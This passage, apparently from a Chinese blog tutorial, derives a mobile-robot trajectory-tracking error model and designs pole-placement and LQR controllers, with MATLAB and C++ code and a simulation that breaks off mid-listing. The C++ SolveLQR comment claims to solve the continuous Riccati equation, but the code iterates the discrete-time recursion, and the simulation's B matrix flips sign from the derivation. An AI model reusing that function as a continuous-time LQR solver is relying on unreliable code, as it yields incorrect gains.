\dot{\theta}_r (y - y_r) + sin\theta_r (\dot{y}- \dot{y}_r) \\\end{aligned}\]</span></p><p>将导数带入得到：</p><p><span class="math display">\[\dot{x}_e = -sin\theta_r \omega_r (x - x_r) + cos\theta_r (v \cos\theta- v_r \cos\theta_r) + cos\theta_r \omega_r (y - y_r) + sin\theta_r (v\sin\theta - v_r \sin\theta_r)\]</span></p><p>我们做小误差角度近似：假设<span class="math inline">\(\theta =\theta_r + \theta_e\)</span>，并且在<spanclass="math inline">\(\theta_e\)</span>较小时展开：</p><p><span class="math display">\[\begin{aligned}cos\theta &amp;\approx cos\theta_r - \theta_e \sin\theta_r \\sin\theta &amp;\approx sin\theta_r + \theta_e cos\theta_r\end{aligned}\]</span></p><p>带入<spanclass="math inline">\(x_e\)</span>的导数中，省略高阶项并化简，得到：</p><p><span class="math display">\[\dot{x}_e = -v_r + v cos\theta_r + \omega_r y_e\]</span></p><p>同理，对于<span class="math inline">\(y_e\)</span>：</p><p><span class="math display">\[\begin{aligned}\dot{y}_e &amp;= \frac{d}{dt}[-sin\theta_r(x - x_r) + cos\theta_r(y -y_r)] \\&amp;= -cos\theta_r \dot{\theta}_r (x - x_r) - sin\theta_r (\dot{x} -\dot{x}_r) + sin\theta_r \dot{\theta}_r (y - y_r) + cos\theta_r (\dot{y}- \dot{y}_r)\end{aligned}\]</span></p><p>带入并化简，得到：</p><p><span class="math display">\[\dot{y}_e = v sin\theta_e - \omega_r x_e\]</span></p><p>对于<span class="math inline">\(\theta_e\)</span>，显然：</p><p><span class="math display">\[\dot{\theta}_e = \dot{\theta} - \dot{\theta}_r = \omega - \omega_r\]</span></p><p>最终得到非线性误差模型：</p><p><span class="math display">\[\left\{\begin{aligned}\dot{x}_e &amp;= -v_r + v cos\theta_r + \omega_r y_e \\\dot{y}_e &amp;= v sin\theta_e - \omega_r x_e \\\dot{\theta}_e &amp;= \omega - \omega_r\end{aligned}\right.\]</span></p><h3 id="线性化误差模型">1.5 线性化误差模型</h3><p>当误差很小时，使用小角度近似：</p><p><span class="math display">\[\begin{aligned}sin\theta_e &amp;\approx \theta_e \\cos\theta_e &amp;\approx 1\end{aligned}\]</span></p><p>将其代入上式，得到线性化的误差状态空间模型：<br /><span class="math display">\[\left\{\begin{aligned}\dot{x}_e &amp;= -v_r + v + \omega_r y_e \\\dot{y}_e &amp;= v \theta_e - \omega_r x_e \\\dot{\theta}_e &amp;= \omega - \omega_r\end{aligned}\right.\]</span></p><p>设误差状态：</p><p><span class="math display">\[X_e = \begin{bmatrix}x_e \\y_e \\\theta_e\end{bmatrix}\]</span></p><p>控制输入误差：</p><p><span class="math display">\[U_e = \begin{bmatrix}v - v_r \\\omega - \omega_r\end{bmatrix}\]</span></p><p>得到线性化的误差状态空间模型：</p><p><span class="math display">\[\dot{X}_e = A X_e + B U_e\]</span></p><p>其中，状态矩阵<span class="math inline">\(A\)</span>和输入矩阵<spanclass="math inline">\(B\)</span>为：</p><p><span class="math display">\[A = \begin{bmatrix}0 &amp; \omega_r &amp; 0 \\-\omega_r &amp; 0 &amp; v_r \\0 &amp; 0 &amp; 0\end{bmatrix}, \quad B = \begin{bmatrix}1 &amp; 0 \\0 &amp; 0 \\0 &amp; 1\end{bmatrix}\]</span></p><h2 id="控制器设计">2 控制器设计</h2><h3 id="极点配置">2.1 极点配置</h3><p>极点配置方法是通过选择合适的状态反馈增益矩阵<spanclass="math inline">\(K\)</span>来将系统的极点移动到期望的位置。</p><h4 id="可控性检验">2.1.1 可控性检验</h4><p>首先检查系统的可控性。构造可控性矩阵<spanclass="math inline">\(C\)</span>： <span class="math display">\[C = \begin{bmatrix}B &amp; AB &amp; A^2B\end{bmatrix} \in \mathbb{R}^{3 \times 6}\Rightarrow rank(C) = 3 \Rightarrow 可控\]</span></p><p>在mATLAB中可以使用<code>ctrb</code>函数验证可控性：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">% 定义状态矩阵A和输入矩阵B</span><br>A = [<span class="hljs-number">0</span> <span class="hljs-number">0.5</span> <span class="hljs-number">0</span>; <span class="hljs-number">-0.5</span> <span class="hljs-number">0</span> <span class="hljs-number">0.4</span>; <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>];<br>B = [<span class="hljs-number">1</span> <span class="hljs-number">0</span>; <span class="hljs-number">0</span> <span class="hljs-number">0</span>; <span class="hljs-number">0</span> <span class="hljs-number">1</span>];<br><span class="hljs-comment">% 计算可控性矩阵</span><br>C = ctrb(A, B);<br><span class="hljs-comment">% 检查可控性</span><br><span class="hljs-keyword">if</span> rank(C) == <span class="hljs-built_in">size</span>(A, <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;系统可控&#x27;</span>);<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;系统不可控&#x27;</span>);<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h4 id="性能指标转化">2.1.2 性能指标转化</h4><p>设计要求：<br />- 超调量<span class="math inline">\(M_p \leq 4\%\)</span><br />- 调节时间<span class="math inline">\(t_s \leq 5\)</span>秒</p><p><span class="math display">\[M_p = e^{-\frac{\zeta \pi}{\sqrt{1 - \zeta^2}}} = 0.04 \Rightarrow \zeta\approx 0.7156 \Rightarrow \zeta = 0.72\]</span></p><p>调节时间满足<span class="math inline">\(2\%\)</span>准则：</p><p><span class="math display">\[t_s = \frac{4}{\zeta \omega_n} \leq 5 \Rightarrow \omega_n \geq\frac{4}{\zeta t_s} = \frac{4}{0.72 \times 5} \approx 1.1111 \Rightarrow\omega_n = 1.2\]</span></p><p>计算目标极点：</p><p><span class="math display">\[s_{1,2} = -\zeta \omega_n \pm j \omega_n \sqrt{1 - \zeta^2} = -0.864 + j0.847\]</span></p><p>设第3个极点为实数且收敛更快：</p><p><span class="math display">\[s_3 = -5 \zeta \omega_n = -4.32\]</span></p><p>所以期望极点为：</p><p><span class="math display">\[s = \{-0.864 + j 0.847, -0.864 - j 0.847, -4.32\}\]</span></p><h4 id="求解增益矩阵">2.1.3 求解增益矩阵</h4><p>给定参考速度<span class="math inline">\(v_r =0.4\)</span>m/s，参考角速度<span class="math inline">\(\omega_r =0.5\)</span>rad/s，得到状态矩阵<spanclass="math inline">\(A\)</span>和输入矩阵<spanclass="math inline">\(B\)</span>：</p><p><span class="math display">\[A = \begin{bmatrix}0 &amp; 0.5 &amp; 0 \\-0.5 &amp; 0 &amp; 0.4 \\0 &amp; 0 &amp; 0\end{bmatrix}, \quad B = \begin{bmatrix}1 &amp; 0 \\0 &amp; 0 \\0 &amp; 1\end{bmatrix}\]</span></p><p>使用MATLAB的<code>place</code>函数求解增益矩阵<spanclass="math inline">\(K\)</span>：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">% 定义状态矩阵A和输入矩阵B</span><br>A = [<span class="hljs-number">0</span> <span class="hljs-number">0.5</span> <span class="hljs-number">0</span>; <span class="hljs-number">-0.5</span> <span class="hljs-number">0</span> <span class="hljs-number">0.4</span>; <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>];<br>B = [<span class="hljs-number">1</span> <span class="hljs-number">0</span>; <span class="hljs-number">0</span> <span class="hljs-number">0</span>; <span class="hljs-number">0</span> <span class="hljs-number">1</span>];<br><span class="hljs-comment">% 期望极点</span><br>desired_poles = [<span class="hljs-number">-0.864</span> + <span class="hljs-number">0.847</span><span class="hljs-built_in">i</span>, <span class="hljs-number">-0.864</span> - <span class="hljs-number">0.847</span><span class="hljs-built_in">i</span>, <span class="hljs-number">-4.32</span>];<br><span class="hljs-comment">% 使用place函数计算增益矩阵K</span><br>K = place(A, B, desired_poles);<br><span class="hljs-comment">% 输出增益矩阵K</span><br><span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;增益矩阵K:&#x27;</span>);<br><span class="hljs-built_in">disp</span>(K);<br></code></pre></td></tr></table></figure><h3 id="lqr控制器设计">2.2 LQR控制器设计</h3><p>LQR控制器设计是通过最小化状态和控制输入的加权二次型来获得最优控制增益矩阵<spanclass="math inline">\(K_{lqr}\)</span>。</p><p>LQR求解最优控制律：</p><p><span class="math display">\[u = -K_{lqr} X_e\]</span></p><p>通过代价函数：</p><p><span class="math display">\[J = \int_0^\infty (X_e^T Q X_e + U_e^T R U_e) dt\]</span></p><p>设计目标：<br />- 惩罚<span class="math inline">\(x_e\)</span>，<spanclass="math inline">\(y_e\)</span>偏差 <spanclass="math inline">\(\rightarrow\)</span> Q权重大<br />- 控制输入不宜过大 <span class="math inline">\(\rightarrow\)</span>R不能过小</p><h4 id="定义权重矩阵">2.2.1 定义权重矩阵</h4><p>选择常用状态权重矩阵<spanclass="math inline">\(Q\)</span>和控制输入权重矩阵<spanclass="math inline">\(R\)</span>： <span class="math display">\[Q = \begin{bmatrix}10 &amp; 0 &amp; 0 \\0 &amp; 10 &amp; 0 \\0 &amp; 0 &amp; 1\end{bmatrix}, \quad R = \begin{bmatrix}1 &amp; 0 \\0 &amp; 1\end{bmatrix}\]</span></p><h4 id="求解lqr增益矩阵">2.2.2 求解LQR增益矩阵</h4><p>使用MATLAB的<code>lqr</code>函数求解LQR增益矩阵<spanclass="math inline">\(K_{LQR}\)</span>：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">% 定义状态矩阵A和输入矩阵B</span><br>A = [<span class="hljs-number">0</span> <span class="hljs-number">0.5</span> <span class="hljs-number">0</span>; <span class="hljs-number">-0.5</span> <span class="hljs-number">0</span> <span class="hljs-number">0.4</span>; <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>];<br>B = [<span class="hljs-number">1</span> <span class="hljs-number">0</span>; <span class="hljs-number">0</span> <span class="hljs-number">0</span>; <span class="hljs-number">0</span> <span class="hljs-number">1</span>];<br><span class="hljs-comment">% 定义权重矩阵Q和R</span><br>Q = [<span class="hljs-number">10</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>; <span class="hljs-number">0</span> <span class="hljs-number">10</span> <span class="hljs-number">0</span>; <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span>];<br>R = [<span class="hljs-number">1</span> <span class="hljs-number">0</span>; <span class="hljs-number">0</span> <span class="hljs-number">1</span>];<br><span class="hljs-comment">% 使用lqr函数计算LQR增益矩阵K_LQR</span><br>K_LQR = lqr(A, B, Q, R);<br><span class="hljs-comment">% 输出LQR增益矩阵K_LQR</span><br><span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;LQR增益矩阵K_LQR:&#x27;</span>);<br><span class="hljs-built_in">disp</span>(K_LQR);<br></code></pre></td></tr></table></figure><p>而在c++中，需要求解Algebraic Riccati Equation(ARE)来得到LQR增益矩阵<span class="math inline">\(K_{LQR}\)</span>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">MatrixXd <span class="hljs-title">SolveLQR</span><span class="hljs-params">(<span class="hljs-type">const</span> MatrixXd&amp; A, <span class="hljs-type">const</span> MatrixXd&amp; B, <span class="hljs-type">const</span> MatrixXd&amp; Q, <span class="hljs-type">const</span> MatrixXd&amp; R)</span></span>&#123;<br>    <span class="hljs-comment">// solve Algebraic Riccati equation: A&#x27;P + PA - PBR^(-1)B&#x27;P + Q = 0</span><br>    MatrixXd P = Q;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)&#123;<br>        MatrixXd P_next = Q + A.<span class="hljs-built_in">transpose</span>() * P * A - A.<span class="hljs-built_in">transpose</span>() * P * B * (R + B.<span class="hljs-built_in">transpose</span>() * P * B).<span class="hljs-built_in">inverse</span>() * B.<span class="hljs-built_in">transpose</span>() * P * A;<br>        <span class="hljs-keyword">if</span>((P_next - P).<span class="hljs-built_in">norm</span>() &lt; <span class="hljs-number">1e-6</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        cout&lt;&lt;<span class="hljs-string">&quot;Iteration &quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;: P norm = &quot;</span> &lt;&lt; (P_next - P).<span class="hljs-built_in">norm</span>() &lt;&lt; endl;<br>        P = P_next;<br>    &#125;<br>    <span class="hljs-comment">// optimal gain matrix K = R^(-1)B&#x27;P</span><br>    <span class="hljs-keyword">return</span> (R + B.<span class="hljs-built_in">transpose</span>() * P * B).<span class="hljs-built_in">inverse</span>() * B.<span class="hljs-built_in">transpose</span>() * P;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到控制增益矩阵<spanclass="math inline">\(K_{lqr}\)</span>后，可以将其应用于控制输入：</p><p><span class="math display">\[A_{lqr} = A - B K_{lqr}\]</span></p><h2 id="仿真">3 仿真</h2><h3 id="matlab仿真">3.1 matlab仿真</h3><p>基于上述推导和设计，使用MATLAB进行仿真。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">% --- 系统参数 ---</span><br>v_r = <span class="hljs-number">0.4</span>; <span class="hljs-comment">% 参考线速度 (m/s)</span><br>omega_r = <span class="hljs-number">0.5</span>; <span class="hljs-comment">% 参考角速度 (rad/s)</span><br><br><span class="hljs-comment">% --- (1) 状态空间模型 ---</span><br>A = [<span class="hljs-number">0</span>, omega_r, <span class="hljs-number">0</span>;<br>     -omega_r, <span class="hljs-number">0</span>, v_r;<br>     <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>];<br>B = [<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>;<br>     <span class="hljs-number">0</span>, <span class="hljs-number">0</span>;<br>     <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>];<br><br><span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;系统矩阵 A:&#x27;</span>); <span class="hljs-built_in">disp</span>(A);<br><span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;输入矩阵 B:&#x27;</span>); <span class="hljs-built_in">disp</span>(B);<br><br><span class="hljs-comment">% 检查系统可控性</span><br>Co = ctrb(A, B);<br>rank_Co = rank(Co);<br><span class="hljs-keyword">if</span> rank_Co &lt; <span class="hljs-built_in">size</span>(A,<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;系统不可控，极点配置可能失败或存在问题。&#x27;</span>);<br>    <span class="hljs-comment">% 注意：对于这个特定的A, B矩阵，由于B(2,1)和B(2,2)为0，</span><br>    <span class="hljs-comment">% y_e 的动态特性主要由A矩阵决定，直接控制能力较弱，</span><br>    <span class="hljs-comment">% 但通过x_e和theta_e的耦合仍可间接影响。</span><br>    <span class="hljs-comment">% 对于这个系统，rank(ctrb(A,B)) = 3，所以是可控的。</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;系统可控。&#x27;</span>);<br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">% --- (2) 极点配置控制器设计 ---</span><br><span class="hljs-comment">% 性能指标</span><br>Mp_spec = <span class="hljs-number">0.04</span>; <span class="hljs-comment">% 超调量 &lt;= 4%</span><br>ts_spec = <span class="hljs-number">5</span>;    <span class="hljs-comment">% 调节时间 (2%准则) &lt;= 5s</span><br><br><span class="hljs-comment">% 根据性能指标计算期望的阻尼比 zeta 和自然频率 omega_n</span><br>zeta = <span class="hljs-built_in">sqrt</span>(<span class="hljs-built_in">log</span>(Mp_spec)^<span class="hljs-number">2</span> / (<span class="hljs-built_in">pi</span>^<span class="hljs-number">2</span> + <span class="hljs-built_in">log</span>(Mp_spec)^<span class="hljs-number">2</span>));<br><span class="hljs-comment">% zeta = 0.7156，取 zeta = 0.72</span><br><span class="hljs-keyword">if</span> zeta &lt; <span class="hljs-number">0.7156</span> <span class="hljs-comment">% 确保满足超调量</span><br>    zeta = <span class="hljs-number">0.72</span>;<br><span class="hljs-keyword">end</span><br>omega_n_min = <span class="hljs-number">4</span> / (zeta * ts_spec);<br><span class="hljs-comment">% omega_n_min = 4 / (0.72 * 5) = 4 / 3.6 = 1.111</span><br><span class="hljs-comment">% 取 omega_n = 1.2 rad/s</span><br>omega_n = <span class="hljs-number">1.2</span>; <br><span class="hljs-keyword">if</span> omega_n &lt; omega_n_min<br>    omega_n = omega_n_min * <span class="hljs-number">1.1</span>; <span class="hljs-comment">% 留些余量</span><br><span class="hljs-keyword">end</span><br><br>fprintf(<span class="hljs-string">&#x27;设计参数: zeta = %f, omega_n = %f rad/s\n&#x27;</span>, zeta, omega_n);<br><br>P_dominant_1 = -zeta*omega_n + <span class="hljs-number">1</span><span class="hljs-built_in">j</span>*omega_n*<span class="hljs-built_in">sqrt</span>(<span class="hljs-number">1</span>-zeta^<span class="hljs-number">2</span>);<br>P_dominant_2 = -zeta*omega_n - <span class="hljs-number">1</span><span class="hljs-built_in">j</span>*omega_n*<span class="hljs-built_in">sqrt</span>(<span class="hljs-number">1</span>-zeta^<span class="hljs-number">2</span>);<br>P_third = <span class="hljs-number">-5</span> * zeta * omega_n; <span class="hljs-comment">% 第三极点，比主导极点快5倍</span><br><br>P_desired = [P_dominant_1, P_dominant_2, P_third];<br><span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;期望配置的极点:&#x27;</span>); <span class="hljs-built_in">disp</span>(P_desired);<br><br>K_pp = place(A, B, P_desired);<br><span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;极点配置控制器增益 K_pp:&#x27;</span>); <span class="hljs-built_in">disp</span>(K_pp);<br><br><span class="hljs-comment">% 闭环系统 (极点配置)</span><br>A_cl_pp = A - B * K_pp;<br>sys_cl_pp = ss(A_cl_pp, <span class="hljs-built_in">zeros</span>(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>), <span class="hljs-built_in">eye</span>(<span class="hljs-number">3</span>), <span class="hljs-number">0</span>); <span class="hljs-comment">% B_dummy=zeros(3,1) 用于观察初始响应</span><br><br><span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;极点配置后闭环系统 A-BK_pp 的特征值:&#x27;</span>); <span class="hljs-built_in">disp</span>(eig(A_cl_pp));<br><br><span class="hljs-comment">% --- (3) LQR 控制器设计 ---</span><br><span class="hljs-comment">% 权重矩阵 Q 和 R (可调参数)</span><br>Q = <span class="hljs-built_in">diag</span>([<span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>]); <span class="hljs-comment">% 惩罚 x_e, y_e 误差较大, theta_e 误差较小</span><br><span class="hljs-comment">% 或者 Q = diag([1/(0.1^2), 1/(0.1^2), 1/(0.1^2)]); % 假设允许误差幅度</span><br>R = <span class="hljs-built_in">diag</span>([<span class="hljs-number">0.1</span>, <span class="hljs-number">0.1</span>]);   <span class="hljs-comment">% 允许一定的控制输入量</span><br><span class="hljs-comment">% 或者 R = diag([1/(0.5^2), 1/(0.5^2)]); % 假设允许控制输入幅度</span><br><br>[K_lqr, S_lqr, E_lqr] = lqr(A, B, Q, R);<br><span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;LQR 控制器增益 K_lqr:&#x27;</span>); <span class="hljs-built_in">disp</span>(K_lqr);<br><br><span class="hljs-comment">% 闭环系统 (LQR)</span><br>A_cl_lqr = A - B * K_lqr;<br>sys_cl_lqr = ss(A_cl_lqr, <span class="hljs-built_in">zeros</span>(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>), <span class="hljs-built_in">eye</span>(<span class="hljs-number">3</span>), <span class="hljs-number">0</span>);<br><br><span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;LQR 控制器闭环系统 A-BK_lqr 的特征值 (E_lqr):&#x27;</span>); <span class="hljs-built_in">disp</span>(E_lqr);<br><br><span class="hljs-comment">% --- 仿真 ---</span><br>t_sim = <span class="hljs-number">0</span>:<span class="hljs-number">0.05</span>:<span class="hljs-number">10</span>; <span class="hljs-comment">% 仿真时间</span><br>p_e0 = [<span class="hljs-number">0.5</span>; <span class="hljs-number">0.3</span>; <span class="hljs-number">0.2</span>]; <span class="hljs-comment">% 初始误差 [x_e(0); y_e(0); theta_e(0)] (例如: 0.5m, 0.3m, 0.2rad)</span><br><br><span class="hljs-comment">% 初始响应</span><br>[y_pp, t_pp, x_pp] = initial(sys_cl_pp, p_e0, t_sim); <span class="hljs-comment">% x_pp 是状态轨迹</span><br>[y_lqr, t_lqr, x_lqr] = initial(sys_cl_lqr, p_e0, t_sim); <span class="hljs-comment">% x_lqr 是状态轨迹</span><br><br><span class="hljs-comment">% --- 绘制响应曲线 ---</span><br><span class="hljs-built_in">figure</span>;<br>sgtitle(<span class="hljs-string">&#x27;跟踪误差响应曲线 (初始误差: x_e=0.5, y_e=0.3, \theta_e=0.2)&#x27;</span>);<br><br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br><span class="hljs-built_in">plot</span>(t_pp, x_pp(:,<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;r-&#x27;</span>, <span class="hljs-string">&#x27;LineWidth&#x27;</span>, <span class="hljs-number">1.5</span>); <span class="hljs-built_in">hold</span> on;<br><span class="hljs-built_in">plot</span>(t_lqr, x_lqr(:,<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;b--&#x27;</span>, <span class="hljs-string">&#x27;LineWidth&#x27;</span>, <span class="hljs-number">1.5</span>);<br>ylabel(<span class="hljs-string">&#x27;x_e (m)&#x27;</span>);<br><span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;极点配置&#x27;</span>, <span class="hljs-string">&#x27;LQR&#x27;</span>);<br>title(<span class="hljs-string">&#x27;纵向误差 x_e&#x27;</span>);<br>grid on;<br><br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br><span class="hljs-built_in">plot</span>(t_pp, x_pp(:,<span class="hljs-number">2</span>), <span class="hljs-string">&#x27;r-&#x27;</span>, <span class="hljs-string">&#x27;LineWidth&#x27;</span>, <span class="hljs-number">1.5</span>); <span class="hljs-built_in">hold</span> on;<br><span class="hljs-built_in">plot</span>(t_lqr, x_lqr(:,<span class="hljs-number">2</span>), <span class="hljs-string">&#x27;b--&#x27;</span>, <span class="hljs-string">&#x27;LineWidth&#x27;</span>, <span class="hljs-number">1.5</span>);<br>ylabel(<span class="hljs-string">&#x27;y_e (m)&#x27;</span>);<br><span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;极点配置&#x27;</span>, <span class="hljs-string">&#x27;LQR&#x27;</span>);<br>title(<span class="hljs-string">&#x27;横向误差 y_e&#x27;</span>);<br>grid on;<br><br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);<br><span class="hljs-built_in">plot</span>(t_pp, x_pp(:,<span class="hljs-number">3</span>), <span class="hljs-string">&#x27;r-&#x27;</span>, <span class="hljs-string">&#x27;LineWidth&#x27;</span>, <span class="hljs-number">1.5</span>); <span class="hljs-built_in">hold</span> on;<br><span class="hljs-built_in">plot</span>(t_lqr, x_lqr(:,<span class="hljs-number">3</span>), <span class="hljs-string">&#x27;b--&#x27;</span>, <span class="hljs-string">&#x27;LineWidth&#x27;</span>, <span class="hljs-number">1.5</span>);<br>ylabel(<span class="hljs-string">&#x27;\theta_e (rad)&#x27;</span>);<br>xlabel(<span class="hljs-string">&#x27;时间 (s)&#x27;</span>);<br><span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;极点配置&#x27;</span>, <span class="hljs-string">&#x27;LQR&#x27;</span>);<br>title(<span class="hljs-string">&#x27;方向误差 \theta_e&#x27;</span>);<br>grid on;<br><br><span class="hljs-comment">% --- 性能分析 (主要针对极点配置，因为其设计目标明确) ---</span><br><span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;--- 极点配置控制器性能分析 ---&#x27;</span>);<br><span class="hljs-comment">% 对于 x_e</span><br>info_xe_pp = stepinfo(x_pp(:,<span class="hljs-number">1</span>), t_pp, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;SettlingTimeThreshold&#x27;</span>, <span class="hljs-number">0.02</span>); <span class="hljs-comment">% Target final value is 0</span><br><span class="hljs-comment">% stepinfo 的超调量是针对从0到某个值的阶跃响应，或者从某个值到0的衰减。</span><br><span class="hljs-comment">% 对于初始条件响应，如果从 p_e0(1) 衰减到 0:</span><br><span class="hljs-comment">% 超调量定义为响应穿过0点后在反向达到的峰值 与 |p_e0(1)| 的比率。</span><br><span class="hljs-comment">% 如果不穿过0点，则超调量为0。</span><br><br><span class="hljs-comment">% x_e 性能</span><br>initial_xe = p_e0(<span class="hljs-number">1</span>);<br>ts_xe_pp = NaN;<br>overshoot_xe_pp = <span class="hljs-number">0</span>;<br><span class="hljs-comment">% 调节时间 (2% 准则)</span><br>settling_threshold_xe = <span class="hljs-number">0.02</span> * <span class="hljs-built_in">abs</span>(initial_xe);<br><span class="hljs-keyword">for</span> k = <span class="hljs-number">1</span>:<span class="hljs-built_in">length</span>(t_pp)<br>    <span 